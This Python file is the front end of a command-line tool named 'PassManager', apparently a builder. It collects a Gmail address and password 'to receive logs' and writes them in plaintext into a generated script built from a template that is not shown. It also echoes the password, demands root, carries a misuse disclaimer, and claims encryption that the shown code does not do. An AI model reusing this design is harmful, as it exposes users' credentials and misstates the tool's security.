# --*-- coding: utf-8 --*--
# Copyright 2020 PassManager
# Written by: * Abhishek patel - abhishekpatel946
# https://github.com/abhishekpatel946/
# Licesed <exists>

import os
import sys
import time
BLUE, RED, WHITE, YELLOW, MEGENTA, GREEN, END = ['\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m']

# run as a root
if not os.geteuid() == 0:
    sys.exit('PassManager must be run as root')

# Clear
def clear():
    os.system('clear')

# ***
def begin():
    os.system('sudo rm -Rf dist')

    email = input('Type your gmail to reciece logs: ')
    epass = input('Type your gmail password: ')
    print('\n')
    print('[ * * * * * * * * * * * * * * * * * * * * * * * * * ]')
    print('\n   email: ' + email)
    print(' password: ' + epass)
    print('\n[ * * * * * * * * * * * * * * * * * * * * * * * * * ]')
    print('\n')
    ask = input('These info above are correct? (y/n) :')
    if ask == 'y' or ask == 'Y':
        pass
    else:
        begin()
    
    template = open('Template/PassManager.py', 'r')
    o = template.read()
    payload = '#/usr/bin/python\n'
    payload += '# --*-- coding: utf-8 --*--\n'
    payload += 'EEMAIL = ' + "'" + email + "'" + '\n'
    payload += 'EPASS = ' + "'" + epass + "'" +'\n'
    payload += str(o)
    with open('k.py', 'w') as f:
        f.write(payload)
        f.close()
    template.close()

# Splash Screen
def warn():
    sys.stdout.write(
        GREEN + '''

########     ###     ######   ######  ##     ##    ###    ##    ##    ###     ######   ######## ########  
##     ##   ## ##   ##    ## ##    ## ###   ###   ## ##   ###   ##   ## ##   ##    ##  ##       ##     ## 
##     ##  ##   ##  ##       ##       #### ####  ##   ##  ####  ##  ##   ##  ##        ##       ##     ## 
########  ##     ##  ######   ######  ## ### ## ##     ## ## ## ## ##     ## ##   #### ######   ########  
##        #########       ##       ## ##     ## ######### ##  #### ######### ##    ##  ##       ##   ##   
##        ##     ## ##    ## ##    ## ##     ## ##     ## ##   ### ##     ## ##    ##  ##       ##    ##  
##        ##     ##  ######   ######  ##     ## ##     ## ##    ## ##     ##  ######   ######## ##     ##   
              
 ''' + RED + '''     
              _________               
             (         )         _____
             ##        ##       ($$$$$$)         ''' + RED + '''      [ Disclaimer Alert ] ''' + RED + '''
             ##        ##      ($$(__)$$)        ''' + WHITE + '''  Not Resposible For Misuse ''' + RED + '''
            (+----------+)     ($$$$$$)          ''' + WHITE + '''    or Illegal Purposes. ''' + RED + '''
            |     __     |     //   /            ''' + WHITE + ''' Use it just for ''' + RED + '''WORK''' + WHITE + ''' or ''' + RED + '''EDUCATIONAL''' + WHITE + ''' ! ''' + RED + '''
            |    (  )    |    // --/
            |     ||     |   // --/    
            |     ||     |  // __/   
            +------------+  \__/               ''' + END)

# Heading
def heading():
    os.system('clear')
    sys.stdout.write(

        GREEN + '''        
          ##********************## 
        ****|| '''+RED+'''  I SECURE YOU '''+GREEN+'''  ||****                      
         @@@@******************@@@@           
         ''' + YELLOW + '''  
             _________             
            (         )         _____
            ##        ##       ($$$$$$) 
            ##        ##      ($$(__)$$)      
           (+==========+)     ($$$$$$)    
           |     __     |     //   /        
           |    (  )    |    // --/      
           |     ||     |   // --/      
           |     ||     |  // __/     
           +============+  \__/           version: '''+WHITE+'''1.0'''+YELLOW+'''
                                           by:''' + WHITE + ' Abhishek Patel (' + YELLOW + 'abhishekpatel946' + WHITE + ')' + '\n' + '\n' + END)    
    print(' {0}[{1}L{0}]{1} LOGIN'.format(YELLOW, END) + ' {0}[{1}A{0}]{1} ABOUT'.format(YELLOW, END) + ' {0}[{1}C{0}]{1} CREDITS'.format(YELLOW, END) + ' {0}[{1}U{0}]{1} UPDATE'.format(YELLOW, END) + ' {0}[{1}Q{0}]{1} Quit'.format(YELLOW, END) + '\n')                               
    # print( YELLOW+'''\n\n\n['''+WHITE+ '''L'''+YELLOW+'''] LOGIN''' + END
    #       + YELLOW+'''\n\n\n['''+WHITE+ '''A'''+YELLOW+'''] ABOUT''' + END 
    #       + YELLOW+'''\n\n\n['''+WHITE+ '''C'''+YELLOW+'''] CREDITS''' + END 
    #       + YELLOW+'''\n\n\n['''+WHITE+ '''U'''+YELLOW+'''] UPDATE''' + END  
    #       + YELLOW+'''\n\n\n['''+WHITE+ '''Q'''+YELLOW+'''] QUIT''' + END  )



# last greetings  
def pp():
    sys.stdout.write('\n\n' + GREEN + ''' Thank You for using PassManager, KEEP CODING; & HACKING :D !!!''' + '\n\n\n' + END)

# about section
def about():
    clear()
    warn()
    sys.stdout.write('\n'
        + YELLOW + '''
            PassManager is a simple pyScript that store your all Credentials & Passwords on 
            google as a ENCRYPTED file. So no one can find decrypt easily and it's stores online
            on your account that's why nobody can find out that decrypted file.

            PassManager is simple add delete CREDENTIALs easily with my pyScript.
            It's a open source script you can contribute and donate for help. '''
        + BLUE + 
            ''' https://github.com/abhishekpatel946/ ''' + END + '\n' )
    # heading()
    sys.exit(0)

# credit section
def credit():
    clear()
    warn()
    sys.stdout.write('\n\n'
        + GREEN + ''' Credits ''' + '\n' 
        + YELLOW + ''' Abhishek Patel [''' + BLUE +''' https://github.com/abhishekpatel946/''' + YELLOW + ''' ] ''' + END + '\n\n' )
    # heading()
    sys.exit(0)

# option;s
def option():
     print('\n {0}[{1}1{0}]{1} Add Credential '.format(BLUE, WHITE) + '\n' + ' {0}[{1}2{0}]{1} Show Credential'.format(BLUE, WHITE) + '\n' + ' {0}[{1}3{0}]{1} Delete Credential'.format(BLUE, WHITE) + '\n' + ' {0}[{1}U{0}]{1} Update'.format(BLUE, WHITE) + '\n' + ' {0}[{1}Q{0}]{1} Quit'.format(BLUE, WHITE) + '\n')

# main funtion
def main():
    clear()
    warn()
    input(YELLOW+'''\n\n\nPRESS ['''+WHITE+ '''ENTER'''+YELLOW+'''] TO CONTINUE''' + END )
    clear()
    heading()
    try:
        while True:
            
            header = ('{0}abhi{1} > {2}'.format(YELLOW, WHITE, END))
            choise = input(header)

            if choise.upper() == 'Q' or choise.upper() == 'QUIT':
                clear()
                pp()
                raise SystemExit
            
            if choise == 'L' or choise.upper() == 'L':
                option()
                print('\n {0}WARNING: Enable access to more secure apps on your email account.{2} \n -> * ONLY WORK WITH GMAIL * :\n {1}https://www.google.com/settings/security/{2}'.format(RED, GREEN, END))
                print('\n NOTE: Don\'t use your personal email, make a dedicated. \n')
            
            if choise ==  'A' or choise.upper() == 'A':
                heading()
                about()
            
            if choise == 'C' or choise.upper() == 'C':
                heading()
                credit()

            if choise == 'U' or choise.upper() == 'UPPER':
                os.system('python3 updater.py')

            if choise.upper() == 'EXIT' or choise.upper() == 'CLOSE':
                clear()
                pp()
                raise SystemExit



    except KeyboardInterrupt:
        clear()
        pp()
        sys.exit(0)


# i like this function 
if __name__ == "__main__":
    main()
